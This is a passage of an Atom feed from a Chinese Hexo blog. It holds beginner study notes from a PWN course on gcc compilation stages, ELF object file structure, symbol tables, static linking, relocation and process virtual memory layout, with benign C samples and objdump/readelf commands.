<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>DU-玉</title>
  
  <subtitle>专心、追寻、珍惜</subtitle>
  <link href="https://poison-biao.github.io/atom.xml" rel="self"/>
  
  <link href="https://poison-biao.github.io/"/>
  <updated>2023-07-13T06:46:43.038Z</updated>
  <id>https://poison-biao.github.io/</id>
  
  <author>
    <name>DU-玉</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>编译与目标文件结构</title>
    <link href="https://poison-biao.github.io/du-yu/pwn-begain-study02.html"/>
    <id>https://poison-biao.github.io/du-yu/pwn-begain-study02.html</id>
    <published>2023-07-13T06:38:47.000Z</published>
    <updated>2023-07-13T06:46:43.038Z</updated>
    
    <content type="html"><![CDATA[<h1 id="编译和目标文件结构"><a href="#编译和目标文件结构" class="headerlink" title="编译和目标文件结构"></a><strong>编译和目标文件结构</strong></h1><h2 id="一、编译"><a href="#一、编译" class="headerlink" title="一、编译"></a>一、编译</h2><p>（GCC）编译环境</p><h3 id="1、root-ubuntu-x2F-3-x2F-pwn-gcc-hello-c"><a href="#1、root-ubuntu-x2F-3-x2F-pwn-gcc-hello-c" class="headerlink" title="1、root@ubuntu ~/3/pwn# gcc hello.c"></a>1、root@ubuntu ~/3/pwn# gcc hello.c</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/001-12.jpg" alt="001-12"></p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/001-6.jpg" alt="001-6"></p><h2 id="1、预编译"><a href="#1、预编译" class="headerlink" title="1、预编译"></a>1、预编译</h2><p>、</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/001-7.jpg" alt="001-7"></p><h3 id="1、root-ubuntu-x2F-3-x2F-pwn-gcc-E-ctf-c-o-ctf-i"><a href="#1、root-ubuntu-x2F-3-x2F-pwn-gcc-E-ctf-c-o-ctf-i" class="headerlink" title="1、root@ubuntu~/3/pwn# gcc-E ctf.c-o ctf.i"></a>1、root@ubuntu~/3/pwn# gcc-E ctf.c-o ctf.i</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/001-9.jpg" alt="001-9"></p><h2 id="2、编译"><a href="#2、编译" class="headerlink" title="2、编译"></a>2、编译</h2><h3 id="1、root-ubuntu-x2F-3-x2F-pwn-gcc-S-ctf-c-o-ctf-s"><a href="#1、root-ubuntu-x2F-3-x2F-pwn-gcc-S-ctf-c-o-ctf-s" class="headerlink" title="1、root@ubuntu~/3/pwn# gcc -S ctf.c -o ctf.s"></a>1、root@ubuntu~/3/pwn# gcc -S ctf.c -o ctf.s</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/001-8.jpg" alt="001-8"></p><h3 id="2、编译器原理"><a href="#2、编译器原理" class="headerlink" title="2、编译器原理"></a>2、编译器原理</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/001-10.jpg" alt="001-10"></p><h3 id="3、汇编器"><a href="#3、汇编器" class="headerlink" title="3、汇编器"></a>3、汇编器</h3><h3 id="1、root-ubuntu-x2F-3-x2F-pwn-gcc-c-hello-s-m32-o-ctf-o"><a href="#1、root-ubuntu-x2F-3-x2F-pwn-gcc-c-hello-s-m32-o-ctf-o" class="headerlink" title="1、root@ubuntu~/3/pwn# gcc -c hello.s -m32 -o ctf.o"></a>1、root@ubuntu~/3/pwn# gcc -c hello.s -m32 -o ctf.o</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/001-11.jpg" alt="001-11"></p><h2 id="二、目标文件格式"><a href="#二、目标文件格式" class="headerlink" title="二、目标文件格式"></a>二、目标文件格式</h2><h3 id="objdump-常用工具"><a href="#objdump-常用工具" class="headerlink" title="objdump(常用工具)"></a>objdump(常用工具)</h3><p><strong><code>objdump</code>查看内存或文件中的数据时，这些工具通常会以十六进制的形式显示数据，因为十六进制比二进制更紧凑，而且比八进制和十进制更容易转换为二进制。</strong></p><p><strong><code>objdump -h</code>命令用于显示二进制文件的节头信息</strong></p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230709172305384.png" alt="image-20230709172305384"></p><ol><li><p>.text段 ：保存编译后的机器指令</p></li><li><p>.data段：保存全局变量和局部静态变量的数据  </p></li><li><p>.bss段：保存未初始化的全局变量和未初始化的局部静态变量</p></li><li><p>.comment：注释段                                                                                                                                                                      <strong>注：</strong><code>.comment</code>段是ELF文件中的一个可选段，通常包含了一些元数据，如编译器版本信息、操作系统版本信息、链接器版本信息等。这些信息对于程序的执行没有影响，但可能对调试、分析或理解二进制文件的来源和构建过程有帮助。</p></li><li><p>.note.GNU-stack:堆栈提示段    </p></li><li><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230709172053432.png" alt="image-20230709172053432"></p></li><li><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230709172825881.png"></p></li><li><p>root@ubuntu~/3/pwn# gcc -c SimpleSection.c -m32  #生成一个32位的文件</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">#include &lt;stdio.h&gt; // 引入标准输入输出库，这样我们就可以使用printf函数了int global_init_var = 84; // 定义并初始化一个全局变量global_init_var，初始值为84int global_uninit_var; // 定义一个全局变量global_uninit_var，未指定初始值，它会被自动初始化为0// 定义一个函数func1，它接受一个整数参数ivoid func1(int i) {    printf("%d\n", i); // 打印参数i的值}// 定义主函数main，它是程序的入口点int main(void) {    static int static_var1 = 85; // 在函数内部定义并初始化一个静态变量static_var1，初始值为85    static int static_var2; // 在函数内部定义一个静态变量static_var2，未指定初始值，它会被自动初始化为0    int a = 1; // 在函数内部定义并初始化一个局部变量a，初始值为1    func1(static_var1 + static_var2 + a); // 调用函数func1，参数为static_var1、static_var2和a的和    return a; // main函数返回a的值，也就是1}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>现在再查看一下文件</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230709175505000.png" alt="image-20230709175505000"></p><p><strong>注：.rodata段表示只读段</strong></p><h2 id=""><a href="#" class="headerlink" title=""></a><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/001-13.jpg" alt="001-13"></h2><h3 id="查看txt代码段：root-ubuntu-x2F-3-x2F-pwn-objdump-s-d-SimSleSection-o"><a href="#查看txt代码段：root-ubuntu-x2F-3-x2F-pwn-objdump-s-d-SimSleSection-o" class="headerlink" title="查看txt代码段：root@ubuntu~/3/pwn# objdump -s -d SimSleSection.o"></a>查看txt代码段：root@ubuntu~/3/pwn# objdump -s -d SimSleSection.o<img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/001-15.jpg" alt="001-15"></h3><p>二进制代码段</p><p>汇编结果</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/001-16.jpg" alt="001-16"></p><h3 id="数据段"><a href="#数据段" class="headerlink" title="数据段"></a>数据段</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230709203945016.png" alt="image-20230709203945016"></p><p>因为是16进制，所以两个字符占用一个字节</p><p>右到左指的是字节</p><p><strong>在编程中，我们通常会根据变量的初始化方式来推断它的进制</strong>：如果一个数值前面没有任何前缀，并且只包含0-9的数字，那么我们通常认为它是一个十进制数。如果一个数值前面有<code>0x</code>或<code>0X</code>前缀，那么我们认为它是一个十六进制数。如果一个数值前面有<code>0b</code>或<code>0B</code>前缀，那么我们认为它是一个二进制数。如果一个数值前面有<code>0</code>前缀，那么我们认为它是一个八进制数。</p><h3 id="rodata段"><a href="#rodata段" class="headerlink" title="rodata段"></a>rodata段<img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230709214554282.png" alt="image-20230709214554282"></h3><h3 id="BSS段"><a href="#BSS段" class="headerlink" title="BSS段"></a>BSS段<img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230709215216928.png" alt="image-20230709215216928"></h3><h3 id="其他段"><a href="#其他段" class="headerlink" title="其他段"></a>其他段<img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/001-19.jpg" alt="001-19"></h3><p>目标程序编译程序时自定义段不能是.开头</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230709220506695.png" alt="image-20230709220506695"></p><h3 id="elf文件结构描述"><a href="#elf文件结构描述" class="headerlink" title="elf文件结构描述"></a>elf文件结构描述</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/001-20.jpg" alt="001-20"></p><h3 id="elf文件头（root-ubuntu-x2F-3-x2F-pwnf-readelf-h-SimpleSection-o）"><a href="#elf文件头（root-ubuntu-x2F-3-x2F-pwnf-readelf-h-SimpleSection-o）" class="headerlink" title="elf文件头（root@ubuntu~/3/pwnf readelf -h SimpleSection.o）"></a>elf文件头（root@ubuntu~/3/pwnf readelf -h SimpleSection.o）</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230709230802832.png" alt="image-20230709230802832"></p><p><strong>魔数</strong>：第一个字节表示<strong>delete</strong>，后面三个字节分别是<strong>e 、l 、 f</strong> 的<strong>ASCII</strong>值</p><p><strong>注：</strong>当操作系统加载一个可执行文件时，它会检查这个魔数来确定文件的格式，以便知道如何处理这个文件。如果这个魔数不是正确，那么操作系统不会按照ELF文件的方式来处理</p><p>魔数后的<strong>第五个字节01</strong>代表的<strong>32位</strong>，<strong>02</strong>代表<strong>64位</strong>，00代表是<strong>无效文件</strong> </p><p><strong>第六个字节01</strong>代表的是<strong>字节序</strong>，规定elf文件的<strong>大端小端（现在简单理解为存储顺序）</strong></p><p><strong>第七个字节01</strong>代表<strong>版本号<em>（一般固定为1）</em></strong></p><p>后面<strong>9个字节</strong>是<strong>扩展字节</strong>，<strong>没有定义</strong>，编译器可以加入自己的字节</p><p> <strong>“Start of sections headers”（节头开始）</strong>指的是ELF文件中<strong>节头表</strong>（Section Header Table）的起始位置。节头表是ELF文件中存储了各个节（Sections）信息的数据结构。每个节都包含了特定类型的数据，如代码、数据、符号表等。</p><h3 id="elf文件段表"><a href="#elf文件段表" class="headerlink" title="elf文件段表"></a>elf文件段表<img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230709231031674.png" alt="image-20230709231031674"></h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230709233939056.png" alt="image-20230709233939056"></p><p><strong>注：</strong>如果一个段表是由40个0组成，那么它是由40个字节的值为0的连续内存组成的，每个0表示一个字节！！！(必须都为0才行)</p><p><strong>偏移地址</strong>：1092+15x40（15表示第十五个段）</p><h4 id="段描述："><a href="#段描述：" class="headerlink" title="段描述："></a>段描述：</h4><p>段名索引：<strong>11</strong>表示接下来11个字节用来<strong>储存段的名字</strong></p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230710224448799.png" alt="image-20230710224448799"></p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230710003604077.png" alt="image-20230710003604077"></p><h2 id="三、目标文件格式分析实践"><a href="#三、目标文件格式分析实践" class="headerlink" title="三、目标文件格式分析实践"></a>三、目标文件格式分析实践</h2><h3 id="步骤："><a href="#步骤：" class="headerlink" title="步骤："></a>步骤：</h3><p>1.touch 创建文件</p><p>2.ls一下</p><p>3.用vim编译器打开文件</p><p>4.敲代码</p><p>5.gcc -c study001.c -m32          ：1.-c选项表示只进行编译而不进行链接   2.编译C语言<strong>源文件</strong>并生成<strong>目标文件</strong></p><p>6.ls查看**.o**文件生成</p><p>7.查看study001.o文件发现是乱码、</p><p>8.objdump -h study001.o 查看目标文件头部信息</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230711102005789.png" alt="image-20230711102005789"></p><h3 id="4-编译文件"><a href="#4-编译文件" class="headerlink" title="4.编译文件"></a>4.编译文件</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230710234254606.png" alt="image-20230710234254606"></p><pre class="line-numbers language-c" data-language="c"><code class="language-c">#include &lt;stdio.h&gt; // 引入标准输入输出库int global_int_84; // 定义一个全局变量，名为 global_int_84，但没有初始化，应该有一个初始值，例如 int global_int_84 = 84;int global_uninit_var; // 定义一个未初始化的全局变量，名为 global_uninit_var，默认值为 0void funcl(int i){ // 定义一个函数，名为 funcl，它接受一个整数参数        printf("%d\n",i); // 在控制台上打印参数 i 的值，然后换行}int main(){ // 定义主函数，程序的执行从这里开始        static int static_var = 85; // 定义一个静态局部变量，名为 static_var，初始值为 85        static int static_var2; // 定义一个未初始化的静态局部变量，名为 static_var2，默认值为 0        int a=1; // 定义一个局部变量，名为 a，初始值为 1        int b; // 定义一个未初始化的局部变量，名为 b，其初始值是未定义的        funcl(static_var+static_var2+a+b); // 调用 funcl 函数，参数为 static_var、static_var2、a 和 b 的和        return a; // 主函数返回 a 的值，即 1}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>按Esc键退出编辑，输入“  ：wq   ” 然后回车</p><p>9.readelf -h study001.o 打开目标文件的<strong>elf头部信息</strong></p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230711000106572.png" alt="image-20230711000106572"></p><p>section header string table index: 14</p><p>段表最后一行40个字节是段表名称的<strong>字符串</strong>所在的<strong>段</strong>的信息</p><h3 id="od-study001-o查看文件-amp-用010分析文件"><a href="#od-study001-o查看文件-amp-用010分析文件" class="headerlink" title="od study001.o查看文件&amp;用010分析文件"></a>od study001.o查看文件&amp;用010分析文件</h3><p>od（octal dump）命令可以将文件内容转换为八进制形式，并以十六进制和ASCII码方式显示。这可以帮助我们查看目标文件的二进制数据，包括文件头部、节（section）的内容以及其他数据。</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230711112050940.png" alt="image-20230711112050940"></p><p>把study001.o放到010中分析</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230711010437475.png" alt="image-20230711010437475"></p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230711010621855.png" alt="image-20230711010621855"></p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230711012214621.png" alt="image-20230711012214621"></p><h2 id="四、符号表："><a href="#四、符号表：" class="headerlink" title="四、符号表："></a>四、符号表：</h2><p>1.符号名=函数名+变量名<strong>（函数和变量统称为符号）</strong></p><p>2.符号是整个链接的粘合器，整个链接<strong>基于符号</strong>才能完成</p><p>3.每一个目标文件都有一个符号表</p><p>4.符号值是函数和变量的<strong>地址</strong></p><p>每16个字节代表一个符号</p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;编译和目标文件结构&quot;&gt;&lt;a href=&quot;#编译和目标文件结构&quot; class=&quot;headerlink&quot; title=&quot;编译和目标文件结构&quot;&gt;&lt;/a&gt;&lt;strong&gt;编译和目标文件结构&lt;/strong&gt;&lt;/h1&gt;&lt;h2 id=&quot;一、编译&quot;&gt;&lt;a href=&quot;#一、编译</summary>
      
    
    
    
    <category term="PWN入门" scheme="https://poison-biao.github.io/categories/PWN%E5%85%A5%E9%97%A8/"/>
    
    
    <category term="PWN入门课程" scheme="https://poison-biao.github.io/tags/PWN%E5%85%A5%E9%97%A8%E8%AF%BE%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>链接</title>
    <link href="https://poison-biao.github.io/du-yu/pwn-begain-study03.html"/>
    <id>https://poison-biao.github.io/du-yu/pwn-begain-study03.html</id>
    <published>2023-07-13T06:38:47.000Z</published>
    <updated>2023-07-13T06:44:07.543Z</updated>
    
    <content type="html"><![CDATA[<h1 id="链接（LINKING）"><a href="#链接（LINKING）" class="headerlink" title="链接（LINKING）"></a>链接（LINKING）</h1><h2 id="一、静态链接"><a href="#一、静态链接" class="headerlink" title="一、静态链接"></a>一、静态链接</h2><p>如果目标文件引用了另外一个目标文件，那么需要生成静态链接 </p><h3 id="1-创建两个C源文件"><a href="#1-创建两个C源文件" class="headerlink" title="1.创建两个C源文件"></a>1.创建两个C源文件</h3><h4 id="002linking-c"><a href="#002linking-c" class="headerlink" title="002linking.c"></a>002linking.c</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c">extern int shared;extern void swap(int* a,int* b);int main(){        int a=100;        swap(&amp;a,&amp;shared);}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="002linking02-c"><a href="#002linking02-c" class="headerlink" title="002linking02.c"></a>002linking02.c</h4><pre class="line-numbers language-C" data-language="C"><code class="language-C">int shared = 1;void swap(int* a,int* b){        *a ^= *b ^= *a ^= *b;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2、生成目标文件"><a href="#2、生成目标文件" class="headerlink" title="2、生成目标文件"></a>2、生成目标文件</h3><p>gcc -c 002linking.c  002linking02.c -fno-stack-protector -m32   生成<strong>002linking.o</strong> 和 <strong>002linking02.o</strong>两个**.o**文件(<code>-fno-stack-protector</code>选项用于关闭栈保护)</p><h3 id="3、将两个文件链接成一个可执行文件"><a href="#3、将两个文件链接成一个可执行文件" class="headerlink" title="3、将两个文件链接成一个可执行文件"></a>3、将两个文件链接成一个可执行文件</h3><p>ld -m elf_i386 002linking.o 002linking02.o -e main -o 002linking03</p><p>注：</p><p>1.使用<code>ld</code>链接器，按照32位的Intel架构，将 002linking.o 和 002linking02.o 这两个目标文件链接成一个可执行文件002linking03，可执行文件的入口点是<code>main</code>函数（运行程序时，<code>main</code>函数会被首先执行）。</p><p>2.-m elf_i386：指定了链接器的目标架构为32位的x86架构</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230711141344927.png" alt="image-20230711141344927"></p><h3 id="4、静态链接以后多出4个字节"><a href="#4、静态链接以后多出4个字节" class="headerlink" title="4、静态链接以后多出4个字节"></a>4、静态链接以后多出4个字节</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230711142353390.png" alt="image-20230711142353390"></p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230711143043203.png" alt="image-20230711143043203"></p><h4 id="查看002linking-o-text段描述-objdump-S"><a href="#查看002linking-o-text段描述-objdump-S" class="headerlink" title="查看002linking.o    text段描述(objdump -S )"></a>查看002linking.o    text段描述(objdump -S )</h4><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230711204453642.png" alt="image-20230711204453642"></p><h4 id="002linking02-o文件"><a href="#002linking02-o文件" class="headerlink" title="002linking02.o文件"></a>002linking02.o文件</h4><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230711204555890.png" alt="image-20230711204555890"></p><h4 id="002linking03文件"><a href="#002linking03文件" class="headerlink" title="002linking03文件"></a>002linking03文件</h4><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230711204630037.png" alt="image-20230711204630037"></p><h2 id="二、空间与地址分配"><a href="#二、空间与地址分配" class="headerlink" title="二、空间与地址分配"></a>二、空间与地址分配</h2><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230712002022380.png" alt="image-20230712002022380"></p><p>32位的Linux系统，程序的虚拟地址空间通常从0x08048000开始。这是因为Linux内核默认将用户空间程序的基地址（也就是.text段的加载地址）设置为0x08048000。这个地址是在内核源代码中硬编码的。</p><h2 id="三、重定位"><a href="#三、重定位" class="headerlink" title="三、重定位"></a>三、重定位</h2><p>1.上面使用 <strong>ld</strong> 链接器将把两个.o文件链接在一起以创建一个可执行文件时，链接器会<strong>自动处理全局符号</strong>重定位。</p><p>2.链接器首先会读取所有输入的目标文件，并收集所有的符号定义和引用。这些信息存储在符号表中。</p><p>3.然后，链接器会解决所有的符号引用。对于每个引用，链接器会查找对应的符号定义，然后计算出该符号在最终可执行文件中的地址。</p><p>4.最后，链接器会更新所有需要重定位的地址引用。这些引用的位置和方式存储在重定位表中。对于表中的每个条目，链接器会根据符号的最终地址和重定位类型，更新对该符号的引用。</p><h3 id="1、重定位效果：objdump-d-分别查看反汇编结果"><a href="#1、重定位效果：objdump-d-分别查看反汇编结果" class="headerlink" title="1、重定位效果：objdump -d 分别查看反汇编结果"></a>1、重定位效果：objdump -d 分别查看反汇编结果</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230712105715702.png" alt="image-20230712105715702"></p><h3 id="2、重定位表"><a href="#2、重定位表" class="headerlink" title="2、重定位表"></a>2、重定位表</h3><p>1、链接器要知道哪些指令要被调整，需要给链接器一个清单，这个清单就是重定位表</p><p>2、重定位表一般是ELF文件的一个段，如.text段重定位表就是rel.text,data段的重定位表就是rel.data</p><h4 id="使用objdump-r-a-o可以看到重定位表"><a href="#使用objdump-r-a-o可以看到重定位表" class="headerlink" title="使用objdump -r a.o可以看到重定位表"></a>使用objdump -r a.o可以看到重定位表</h4><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230712113952650.png" alt="image-20230712113952650"></p><p><strong>十六进制寻址：</strong>在”00000028”中，最右边的位是8，它是第0位，所以你将8乘以16的0次方得到8*1=8。</p><p>然后，向左移动一位，你有2，这是第1位，所以你将2乘以16的1次方得到2*16=32。</p><h2 id="四、链接的符号解析功能"><a href="#四、链接的符号解析功能" class="headerlink" title="四、链接的符号解析功能"></a>四、链接的符号解析功能</h2><p>1、a.c在生成目标文件的时候，并没有定义share变量和swap函数，但是在没有链接之前，gcc也不能说这两</p><p>个引用不存在，那么怎么确定是外部引用的符号，还是源代码手滑写错了的符号呢？</p><p>2、那就是用链接器在全局符号表中查找，能找到就进行修正虚拟地址，找不到肯定不能链接通过，因为调</p><p>用了不存在的引用</p><h3 id="1、objdump-s"><a href="#1、objdump-s" class="headerlink" title="1、objdump  -s"></a>1、objdump  -s</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230712132412141.png" alt="image-20230712132412141"></p><h2 id="五、静态库链接"><a href="#五、静态库链接" class="headerlink" title="五、静态库链接"></a>五、静态库链接</h2><p>静态库</p><p>目前理解就是一个运行调用的 库而已</p><h2 id="六、进程虚拟地址空间"><a href="#六、进程虚拟地址空间" class="headerlink" title="六、进程虚拟地址空间"></a>六、进程虚拟地址空间</h2><p>1、32位操作系统的最大寻址范围位4GB</p><p>2、64位操作系统的最大寻址范围围位17 179 869 184 GB，即2的64次方 = 16EiB，通常而言，操作系统虚</p><p>拟地址空间无需这么大的空间，于是通常设定64位操作系统的虚拟地址寻址空间大小是<strong>48位</strong>，也就是<strong>2的48</strong></p><p><strong>次方</strong> = 256TB</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230712164945449.png" alt="image-20230712164945449"></p><h4 id="1-采用十六进制转化位十进制寻址："><a href="#1-采用十六进制转化位十进制寻址：" class="headerlink" title="1.采用十六进制转化位十进制寻址："></a>1.采用十六进制转化位十进制寻址：</h4><p>0xC0000000=<strong>12 * 16^7 + 0 * 16^6 + 0 * 16^5 + 0 * 16^4 + 0 * 16^3 + 0 * 16^2 + 0 * 16^1 + 0 * 16^0</strong>= 3221225472</p><p>0xFFFFFFFF=4,294,967,295=4GB</p><p>0xFFFFFFFF-0xC0000000=1GB</p><h4 id="补充：十六进制转化为2进制"><a href="#补充：十六进制转化为2进制" class="headerlink" title="补充：十六进制转化为2进制"></a>补充：十六进制转化为2进制</h4><p>因为16等于2的4次方，所以每个十六进制数字都可以用4个二进制位来表示。</p><p>例如，如果我们要将F（十六进制中的15）转换为二进制，我们可以这样做：</p><ol><li>首先，我们知道F在十六进制中代表15。</li><li>然后，我们可以将15转换为二进制。这可以通过以下步骤完成：<ul><li>15除以2等于7余1，所以最低位是1。</li><li>7除以2等于3余1，所以下一位是1。</li><li>3除以2等于1余1，所以下一位是1。</li><li>1除以2等于0余1，所以最高位是1。</li></ul></li><li>因此，15在二进制中表示为1111。</li></ol><h2 id="七、装载方式"><a href="#七、装载方式" class="headerlink" title="七、装载方式"></a>七、装载方式</h2><p>和前面计算机基础中的分页技术差不多</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230712170412317.png" alt="image-20230712170412317"></p><h2 id="八、覆盖装入"><a href="#八、覆盖装入" class="headerlink" title="八、覆盖装入"></a>八、覆盖装入</h2><p> 原理：目前处理谁的数据就让谁坐在处理的位置上 </p><p>医生看病原理：病人A问诊后被医生叫去拍片，病人B问诊后拍片…，直到病人A拿到片子回来后其他病人停</p><p>止问诊，医生给病人A看片，病人A就是覆盖装入</p><h2 id="九、页映射"><a href="#九、页映射" class="headerlink" title="九、页映射"></a>九、页映射</h2><p>1、页映射不是一下子把程序的所有数据和指令都装入内存</p><p>2、而是将内存和磁盘中所有的数据和指令按照页（page）为单位划分成若干个页</p><p>3、目前常见的页大小为4096字节，也就是4KB，1KB的数据也是交换4KB，交换的就是4KB的倍数</p><h2 id="十、进程虚拟空间分布"><a href="#十、进程虚拟空间分布" class="headerlink" title="十、进程虚拟空间分布"></a>十、进程虚拟空间分布</h2><p>1、合并<strong>相同权限</strong>的段（Section）到同一个节（Segment）</p><p>2、对于相同权限的段，把它们合并到一起当作一个节（Segment）进行映射</p><p>3、节（Segment）装载的角度<strong>重新划分</strong>了ELF的各个段</p><p>之前段已经划分好了，接下来就是划分节了</p><p><strong>如：</strong>滴滴打车，每个人至少叫一 辆车（不可能半辆），相当于ElF文件执行程序至少需要一个页，如果有20个人</p><p>去5个小区，每人一辆车就浪费了，如果按照相同属性划分（同一个小区的为一类）节，就可以只要5辆车，</p><p>利用资源。   合并加载便于页映射，减少出现<strong>1KB</strong>的数据也是交换<strong>4KB</strong>的情况，利用资源</p><p>1、<strong>Section</strong>和<strong>Segment</strong>是对ElF文件描述的两种视图</p><p>2、<strong>Section</strong>偏向于静态链接（链接视图Linking View）</p><p>3、<strong>Segment</strong>偏向于<strong>动态转载</strong>（执行视图Execution View）</p><h3 id="1、例子C源码00204-c"><a href="#1、例子C源码00204-c" class="headerlink" title="1、例子C源码00204.c"></a>1、例子C源码00204.c</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;char*flag ="CTFDU-YU{flag_is_here}";int main(){ printf("%s",flag); return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-静态编译-gcc-static-00204-c-m32-o-00204"><a href="#2-静态编译-gcc-static-00204-c-m32-o-00204" class="headerlink" title="2.静态编译  gcc -static 00204.c -m32 -o 00204"></a>2.静态编译  gcc -static 00204.c -m32 -o 00204</h4><p>生成静态链接可执行文件</p><p>readelf -S text2 查看段信息，readlelf -l text2 查看节信息</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230713003655633.png" alt="image-20230713003655633"></p><ul><li>Type：段的类型。例如，LOAD 表示该段应加载到内存中，NOTE 表示该段包含辅助信息，GNU_STACK 表示该段包含堆栈信息，等等。</li><li>Offset：该段在文件中的偏移量。</li><li>VirtAddr：该段在内存中的虚拟地址（程序入口）</li><li>PhysAddr：该段在内存中的物理地址。对于可执行和共享对象文件，此字段通常被忽略。</li><li>FileSiz：该段在文件中的大小。</li><li>MemSiz：该段在内存中的大小。</li><li>Flg：该段的标志。R 表示可读，W 表示可写，E 表示可执行。</li><li>Align：该段在文件和内存中的对齐</li></ul><p>Section to Segement mapping 中写清楚了那些段映射到了哪些节</p><p>LOAD类型说明是需要映射的，其他不需要映射</p><p>上图就是相同权限的段合并到同一个节中</p><p>前两节通过Flg段得知：</p><p>00 可读可执行 可以看到里面有.text .rodata段</p><p>01 可读可写 可以看到里面有.data段</p><p>Align：字节对齐</p><p>1000h=4kb，所以两个节分别映射到两个页中</p><h2 id="十一、程序表头"><a href="#十一、程序表头" class="headerlink" title="十一、程序表头"></a>十一、程序表头</h2><p>1.ElF可执行文件中有一个专门的数据结构叫程序头表（Program Header Table），用来保存Segment信息</p><p>2.程序头表（Program Header Table）：这部分主要用于程序的加载。它描述了一系列的段（Segment），每个段包含了一些在程序执行时需要加载到内存中的信息。例如，代码段（.text）包含了程序的机器代码，数据段（.data）包含了程序的全局变量等。</p><p>3。无论是静态编译还是动态编译，只要生成了 ELF 格式的可执行文件，就会有程序头表。静态编译和动态编译的主要区别在于，静态编译会将所有的库函数都直接链接到可执行文件中，而动态编译则会在运行时动态链接库函数。这会影响到 ELF 文件的大小和复杂性，但并不会影响到程序头表的存在。</p><p>4.ELF (Executable and Linkable Format) 文件有三种主要类型：可重定位的文件（Relocatable file）、可执行文件（Executable file）和共享对象文件（Shared object file）。</p><ul><li>可重定位的文件（通常是编译器输出的目标文件，扩展名通常为 .o）只包含代码和数据，它们需要通过链接器（linker）与其他目标文件或库文件链接在一起，生成可执行文件或共享对象文件。因为这些文件不需要被直接执行，所以它们通常不包含程序头表（Program Header Table），只包含节头表（Section Header Table）。</li><li>可执行文件和共享对象文件（通常是动态链接库，Linux下扩展名通常为 .so）是需要被装载到内存中执行的，所以它们包含程序头表。程序头表描述了如何将文件的内容加载到内存中以供执行。</li></ul><p>注：共享库是动态库，和静态库有很大区别，每个使用静态库的程序都有一份静态库的副本。</p><h4 id="readelf-h-查看elf文件头信息"><a href="#readelf-h-查看elf文件头信息" class="headerlink" title="readelf -h 